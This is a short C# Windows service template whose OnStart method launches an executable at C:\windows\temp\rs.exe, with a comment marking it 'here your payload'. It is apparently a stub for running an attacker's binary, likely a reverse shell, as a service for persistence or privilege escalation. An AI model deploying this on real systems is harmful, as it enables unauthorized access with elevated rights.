﻿using System.IO;
using System.ServiceProcess;

namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            //here your payload
            string payL = @"C:\windows\temp\rs.exe";
            // eventually parameters
            string paramS = string.Empty;

            if (File.Exists(payL)) System.Diagnostics.Process.Start(payL, paramS);
            
            else throw new System.Exception("The executable file has not been found");

            
        }

        protected override void OnStop()
        {
        }
    }
}
